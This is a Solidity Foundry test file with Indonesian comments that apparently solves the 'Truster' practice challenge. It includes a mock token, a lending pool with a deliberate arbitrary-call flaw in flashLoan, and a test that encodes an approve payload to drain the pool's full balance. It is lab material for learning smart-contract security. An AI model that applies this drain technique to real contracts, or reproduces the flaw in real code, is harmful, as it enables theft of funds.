// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// 1. MOCK TOKEN (ERC20 Standar)
contract DamnValuableToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        // Cetak uang buat Pool
        balanceOf[msg.sender] = 1_000_000 ether;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Not enough funds");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(allowance[from][msg.sender] >= amount, "Allowance not enough");
        require(balanceOf[from] >= amount, "Balance not enough");
        
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// 2. THE TARGET (Truster Pool)
contract TrusterLenderPool {
    DamnValuableToken public token;

    constructor(address _token) {
        token = DamnValuableToken(_token);
    }

    // Fungsi Flash Loan yang berbahaya
    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external {
        uint256 balanceBefore = token.balanceOf(address(this));

        // 1. Kirim uang pinjaman (kalau amount > 0)
        token.transfer(borrower, amount);

        // 2. --- CELAH MAUT ---
        // Pool akan memanggil fungsi apapun di alamat 'target' dengan data 'data'
        (bool success, ) = target.call(data);
        require(success, "External call failed");

        // 3. Cek pengembalian
        uint256 balanceAfter = token.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan not repaid");
    }
}

// 3. ATTACK SCRIPT
contract TrusterTest is Test {
    TrusterLenderPool pool;
    DamnValuableToken token;
    address attacker = address(0xBAD);

    function setUp() public {
        // Deploy Token & Pool
        token = new DamnValuableToken();
        pool = new TrusterLenderPool(address(token));

        // Transfer 1 Juta Token ke Pool (Sesuai soal)
        token.transfer(address(pool), 1_000_000 ether);
    }

    function test_Truster_Attack() public {
        vm.startPrank(attacker);

        console.log("--- BEFORE ATTACK ---");
        console.log("Pool Balance:", token.balanceOf(address(pool)));
        console.log("Attacker Balance:", token.balanceOf(attacker));

        // 1. SIAPKAN PAYLOAD
        // Kita membungkus perintah: "approve(attacker, 1 Juta Ether)"
        // Perhatikan komanya! Argumen dipisah, tidak pakai tanda kutip.
        bytes memory payload = abi.encodeWithSignature(
            "approve(address,uint256)", 
            attacker, 
            1_000_000 ether
        );

        // 2. EKSEKUSI FLASH LOAN
        // Kita suruh Pool memanggil fungsi approve ke dirinya sendiri (Token Contract)
        pool.flashLoan(0, attacker, address(token), payload);

        // 3. FINISHING MOVE (AMBIL DUITNYA)
        // Sekarang kita sudah punya izin (allowance).
        // Gunakan 'transferFrom' untuk memindahkan uang dari Pool ke Kita.
        // Jangan lupa pakai 'ether'!
        token.transferFrom(address(pool), attacker, 1_000_000 ether);

        console.log("--- AFTER ATTACK ---");
        console.log("Pool Balance:", token.balanceOf(address(pool)));
        console.log("Attacker Balance:", token.balanceOf(attacker));

        // VERIFIKASI
        assertEq(token.balanceOf(address(pool)), 0);
        assertEq(token.balanceOf(attacker), 1_000_000 ether);

        vm.stopPrank();
    }
    
}